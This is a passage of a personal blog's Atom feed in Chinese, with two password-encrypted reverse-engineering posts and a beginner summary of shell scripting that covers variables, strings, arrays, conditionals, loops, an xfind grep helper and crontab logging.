KGL+dQXWBjH/4vEGSuA4aQxUybnMWIXSpa8AbPgYmAtPnskZy1vsMG9wDj5J/dWTvhVYFwjecH1DwerPyx6HTDbgLBUuVusT5f4YG5va6JHi3uYSti96aeNpQyg41niPqbPqHVAm33+</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
</feed>
